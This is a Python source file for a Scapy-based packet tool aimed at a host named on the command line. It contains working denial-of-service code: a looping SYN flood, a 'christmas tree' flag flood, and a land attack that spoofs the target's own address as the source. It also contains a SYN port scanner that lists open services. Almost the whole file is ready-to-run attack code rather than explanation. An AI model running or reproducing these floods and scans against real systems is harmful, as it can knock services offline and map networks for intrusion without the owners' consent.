import getopt
from scapy.layers.inet import TCP, IP, Ether, ICMP
from scapy.all import Raw, send
from scapy.sendrecv import sr1
from scapy.volatile import RandShort
import sys
import random
import socket

# --Globals--
flood = False
scan = False
land = False
flags = []
ports = "0"
target = ""

def main():
    #configure_ports()

    if scan:
        port_scan()
    elif flood:
        syn_flood()
    elif land:
        land_attack()
    else:
        christmas_tree_attack()

def christmas_tree_attack():
    packets = []
    attack_flags = "".join(i for i in flags)
    packet = IP(dst=target, ttl=64)/\
             TCP(sport=RandShort(), flags=attack_flags, dport=random.randint(0, 65535), seq=random.randint(200000000, 500000000))/\
             Raw(b"X"*1024)
    for i in range(200):
        packets.append(packet)
    send(packets, loop=1, verbose=0)
    print("\n")


def land_attack():
    # Land attack
    attack_flags = "".join(i for i in flags)
    send(IP(dst=target, src=target, ttl=64)
         /TCP(sport=RandShort(), flags=attack_flags, dport=int(ports), seq=random.randint(200000000,500000000))
         /Raw(b"X"*1024), loop=1, verbose=0)
    print("\n")

def syn_flood():
    print("In flood mode, no replies will be shown")
    attack_flags = "".join(i for i in flags)
    # Send packet in loop until ctrl+c is pressed
    send(IP(dst=target, ttl=64)
         /TCP(sport=RandShort(), flags=attack_flags, dport=int(ports), seq=random.randint(200000000,500000000))
         /Raw(b"X"*1024), loop=1, verbose=0)
    print("\n")


def get_service(port):
    try:
        return socket.getservbyport(port)
    except OSError:
        return "\t"


def port_scan():
    attack_flags = "".join(i for i in flags)
    no_response = []
    ports_arr = []
    for i in range(int(ports.split("-")[0]), int(ports.split("-")[1])+1):
        ports_arr.append(i)
    print(f"{len(ports_arr)} ports to scan!");
    print("+----+-----------+---------+---+-----+-----+-----+");
    print("|port| serv name |  flags  |ttl| id  | win | len |");
    print("+----+-----------+---------+---+-----+-----+-----+");
    for port in ports_arr:
        scan_response = sr1(IP(dst=target, ttl=64)/TCP(sport=RandShort(), dport=port, flags=attack_flags), verbose=0)
        if scan_response is not None:
            if scan_response.haslayer(TCP):
                if scan_response[TCP].flags == 18:
                    # Service running
                    service = get_service(port)
                    print(f"{port}\t{service}\t{scan_response[TCP].flags}\t{scan_response[IP].ttl}\t{scan_response[IP].id}\t{scan_response[TCP].window}\t{scan_response[IP].len}\n")
                    # Close connection
                    sr1(IP(dst=target, ttl=64)/TCP(sport=RandShort(), dport=port, flags="R"),
                        timeout=1, verbose=0)
                elif scan_response[TCP].flags == 20:
                    # No service running
                    print(f"RA from {get_service(port)}")
            elif scan_response.haslayer(ICMP):
                if scan_response[ICMP].type == 3 and scan_response[ICMP].code in [1, 2, 3, 9, 10, 13]:
                    # Silently dropped by firewall
                    continue
        else:
            no_response.append(port)


def parse_ports():
    # Todo
    pass


def usage():
    txt = """\nWelcome! Usage can be seen below. If you
wish stop a request, press ctrl + c"""
    print(txt)
    print("-------------------------------------------\n")
    print("usage: python main.py host [options]")
    print("-h  --help   show this help")
    print("    --flood  sent packets as fast as possible. Don't show replies.")
    print("-S  --syn    set syn flag")
    print("-p  --destport   specify destination port")


def process_args():
    global flood, target, scan, ports, flags, land
    try:
        opts, args = getopt.getopt(sys.argv[1:], "ha:8:SFPUp:", ["help", "flood", "syn", "fin", "push", "urg", "destport=", "scan="])
    except getopt.GetoptError as err:
        # print help information and exit:
        print(err)  # will print something like "option -a not recognized"
        sys.exit(2)
    for option, argument in opts:
        if option in ("-h", "--help"):
            usage()
        elif option == "--flood":
            flood = True
        elif option == "-a":
            flood = True
        elif option in ("-S", "--syn"):
            flags.append("S")
        elif option in ("-F", "--fin"):
            flags.append("F")
        elif option in ("-P", "--push"):
            flags.append("P")
        elif option in ("-U", "--urg"):
            flags.append("U")
        elif option in ("-p", "--destport"):
            ports = argument
        elif option in ("-8", "--scan"):
            scan = True
            ports = argument
        else:
            assert False, "unhandled option"
    if len(args) != 1:
        print(args)
        print("Must specify a single host after the options!")
        sys.exit(1)
    else:
        target = args[0]

if __name__ == "__main__":
    process_args()
    main()




